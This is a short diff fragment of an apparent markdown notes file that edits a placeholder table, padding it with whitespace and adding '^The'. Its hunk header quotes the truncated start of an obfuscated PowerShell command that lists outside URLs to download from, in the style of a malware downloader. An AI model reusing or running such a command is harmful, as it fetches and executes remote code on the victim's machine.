@@ -39,11 +39,11 @@ powershell $BYi='rfd';$iQF='http://mahimamedia.com/YxdW87t@http://mandujano.net/
 
 
 
-| Reg           | Defination    |
-| ------------- |:-------------:| 
-| col 3 is      | right-aligned |
-| col 2 is      | centered      | 
-| zebra stripes | are neat      |  
+| Reg           |                                                                        Defination    |
+| ------------- |                                                                       :-------------:| 
+| ^The          |                                                                        right-aligned |
+| col 2 is      |                                                                        centered      | 
+| zebra stripes |                                                                        are neat      |  
 
 
 
